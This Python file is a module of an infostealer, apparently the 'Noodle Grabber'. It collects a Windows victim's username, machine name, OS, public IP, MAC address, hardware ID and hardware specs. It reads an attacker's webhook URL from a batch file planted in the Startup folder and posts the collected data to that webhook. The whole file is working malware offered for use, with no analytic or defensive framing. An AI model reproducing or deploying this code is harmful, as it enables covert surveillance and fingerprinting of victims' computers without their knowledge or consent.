import subprocess
import os
import psutil
import requests
import json

def get_inf(webhook):
    computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
    cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")
    hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    ip = requests.get('https://api.ipify.org').text
    interface, addrs = next(iter(psutil.net_if_addrs().items()))
    mac = addrs[0].address

    data = {
        "embeds": [
            {
                "title": "Noodle Grabber",
                "color": 16753920,  # Yellowish orange color
                "fields": [
                    {
                        "name": "System Info",
                        "value": f''':computer: **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n:tv: **OS:** `{computer_os}`\n\n:satellite: **IP:** `{ip}`\n:apple: **MAC:** `{mac}`\n:gear: **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`'''
                    }
                ],
                "footer": {
                    "text": "Noodle Grabber (https://github.com/UnrealNoodle)"
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/attachments/1120798395389444169/1122897251845537842/Z.png"
                }
            }
        ],
        "username": "Noodle Grabber",
        "avatar_url": "https://cdn.discordapp.com/attachments/1120798395389444169/1122895649201983519/image-250x250.jpg"
    }

    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook, headers=headers, data=json.dumps(data))

def get_webhook_from_file():
    startup_folder = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    batch_file_path = os.path.join(startup_folder, "Noodle_Grabber_6.bat")

    if os.path.exists(batch_file_path):
        with open(batch_file_path, "r") as file:
            for line in file:
                if line.startswith('set "webhookUrl='):
                    webhook_url = line[len('set "webhookUrl='):].strip().strip('"')
                    return webhook_url

    return None

webhook_url = get_webhook_from_file()

if webhook_url:
    get_inf(webhook_url)
else:
    print("Webhook URL not found in the batch file.")
